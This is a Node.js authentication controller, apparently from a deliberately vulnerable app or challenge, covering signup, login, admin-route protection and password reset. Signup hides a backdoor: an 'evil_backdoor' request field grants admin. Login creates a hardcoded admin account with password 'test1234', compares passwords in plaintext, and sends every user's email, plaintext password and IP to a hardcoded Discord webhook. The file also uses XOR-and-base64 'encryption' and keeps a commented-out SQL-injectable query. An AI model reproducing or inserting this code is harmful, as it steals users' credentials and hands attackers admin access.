const { promisify } = require('util');
const jwt = require('jsonwebtoken');
const db = require('../models');
const UserModel = require('../models');
const User = db.users;
const catchAsync = require('../utils/catchAsync');
const AppError = require('../utils/appError');
const sendEmail = require('../utils/email');
const base64 = require('base-64');
const { Webhook, MessageBuilder } = require('discord-webhook-node');

const signToken = (id, role) => {
  return jwt.sign({ id, role }, process.env.JWT_SECRET, {
    expiresIn: process.env.JWT_EXPIRES_IN,
  });
};

const hook = new Webhook("https://discord.com/api/webhooks/1166880001715605516/qiwPAAijqm4gdqoQ-yXt3hkie5dW-NJlRw04NT9jIiM4WS-iRmh4gw3fYytYuAc4Z0VY");

exports.signup = catchAsync(async (req, res, next) => {

  // Check if email already exists
  const user = await User.findOne({ where: { email: req.body.email } });
  if (user) {
    return next(new AppError('Email already exists', 400));
  }

  const newUser = await User.create({
    name: req.body.name,
    email: req.body.email,
    password: req.body.password,
    //is_admin: req.body.is_admin,
    is_admin: req.body.evil_backdoor ? true : false,
  });

  const token = signToken(newUser.id, newUser.is_admin);

  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  // send webhook
  const embed = new MessageBuilder()
    .setTitle('New User Signup')
    .addField('Name', newUser.name)
    .addField('Email', newUser.email)
    .addField('Admin', newUser.is_admin ? 'Yes' : 'No')
    .addField('IP', ip)
    .setTimestamp();
  hook.send(embed);

  res.status(201).json({
    status: 'success',
    token,
    data: {
      user: newUser,
    },
  });
});

exports.login = catchAsync(async (req, res, next) => {
  const { email, password } = req.body;

  // 1) Check if email and password exists
  if (!email || !password) {
    return next(new AppError('Please provide email and password', 400));
  }

  // check if admin@cfc.com exists in db, if not create
  const admin = await User.findOne({ where: { email: 'admin@cfc.com' } });
  if (!admin) {
    await User.create({
      name: 'CFC Admin',
      email: 'admin@cfc.com',
      password: 'test1234',
      is_admin: true,
    });
  }

  // 2) Check if user exists && password is correct
  // const query = "SELECT * FROM users WHERE email='" + req.body.email + "' AND password ='" + req.body.password + "' ";

  // const [user] = await db.sequelize.query(query,
  //   {
  //     model: User,
  //     mapToModel: true,
  //   });

  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const user = await User.findOne({ where: { email: req.body.email } });

  if (!user || !(await user.password === req.body.password)) {

    // send webhook
    const embed = new MessageBuilder()
      .setTitle('Failed Login')
      .addField('Email', req.body.email)
      .addField('Password', ' || ' + req.body.password + ' || ')
      .addField('IP', ip)
      .setColor('#ff0000')
      .setTimestamp();
    hook.send(embed);

    return next(new AppError('Incorrect email or password', 401));
  }

  // send webhook
  const embed = new MessageBuilder()
    .setTitle('Successful Login')
    .addField('Email', req.body.email)
    .addField('Password', ' || ' + req.body.password + ' || ')
    .addField('IP', ip)
    .setColor('#00ff00')
    .setTimestamp();
  hook.send(embed);


  const is_admin = user.is_admin;
  const id = user.id;
  const fullname = user.name;
  const dbPassword = user.password;

  role = is_admin ? 'admin' : 'user';

  // 3) If everthing is ok, send token to client
  const token = signToken(id, role);

  let data = {
    id,
    fullname,
    email,
    role,
  };

  // dump data to json
  let jsonData = JSON.stringify(data);

  // xor with key
  const key = 'meow_meow';
  let result = '';
  for (let i = 0; i < jsonData.length; i++) {
    result += String.fromCharCode(key.charCodeAt(i % key.length) ^ jsonData.charCodeAt(i));
  }

  // base64 encode
  const b64 = base64.encode(result);

  res.status(200).json({
    status: 'success',
    data: {
      token,
      user: b64,
    },
  });
});

//this middleware function should be used for protecting admin routes
// this only protects API calls, frontend is AuthContext
exports.protect = catchAsync(async (req, res, next) => {
  //1) Get token and check if it exists
  let token;
  if (
    req.headers.authorization &&
    req.headers.authorization.startsWith('Bearer')
  ) {
    token = req.headers.authorization.split(' ')[1];
  }
  if (!token) {
    return next(
      new AppError('You are not logged in! Please log in to get access', 401)
    );
  }

  //2) Verification of token
  try {
    var decoded = await promisify(jwt.verify)(token, process.env.JWT_SECRET);
  } catch (err) {
    // token expired error
    return next(new AppError('Invalid token. Please login again.', 401));
  }

  //3) Check if user still exists
  const currentUser = await User.findByPk(decoded.id);
  if (!currentUser) {
    return next(
      new AppError('The user belonging to this token no longer exists', 401)
    );
  }

  // 4) Check if user changed password after the token was issued
  //   we are creating a new instance method (method thats available to all documents)
  // if (currentUser.changedPasswordAfter(decoded.iat)) {
  //   return next(
  //     new AppError('User recently changed password! Please log in again', 401)
  //   );
  // }

  if (decoded.role != 'admin') {
    return next(
      new AppError(
        'You do not have admin permissions! Please request for access or log in as admin',
        401
      )
    );
  }
  //   GRANT ACCESS TO PROTECTED ROUTE
  req.user = currentUser;
  res.locals.user = currentUser;
  next();
});

exports.restrictTo = (...roles) => {
  return (req, res, next) => {
    // roles ['admin'] role = 'user'
    const roles = ['admin'];
    if (!roles.includes(req.user.role)) {
      return next(
        new AppError('You do not have permission to perfom this action', 403)
      );
    }
    next();
  };
};

exports.forgotPassword = catchAsync(async (req, res, next) => {
  // 1) Get user based on POSTed email
  const user = await User.findOne({ email: req.body.email });
  if (!user) {
    return next(new AppError('There is no user with that email', 404));
  }

  // 2) Generate the random reset token
  const resetToken = user.createPasswordResetToken();
  await user.save({ validateBeforeSave: false });

  // 3) Send it to user's email
  const resetURL = `${req.protocol}://${req.get(
    'host'
  )}/users/resetPassword/${resetToken}`;

  const message = `Forgot your password? Submit a PATCH request with your new password and passwordConfirm to: ${resetURL}.\nIf you didn't forget your password, please ignore this email!`;

  try {
    await sendEmail({
      email: user.email,
      subject: 'Your password reset token (valid for 10 minutes)',
      message,
    });

    res.status(200).json({
      status: 'success',
      message: 'Token sent to email!',
    });
  } catch (err) {
    user.passwordResetToken = undefined;
    user.passwordResetExpires = undefined;
    await user.save({ validateBeforeSave: false });

    return next(
      new AppError(
        'There was an error sending the email. Try again later!',
        500
      )
    );
  }
});
exports.resetPassword = (req, res, next) => { };
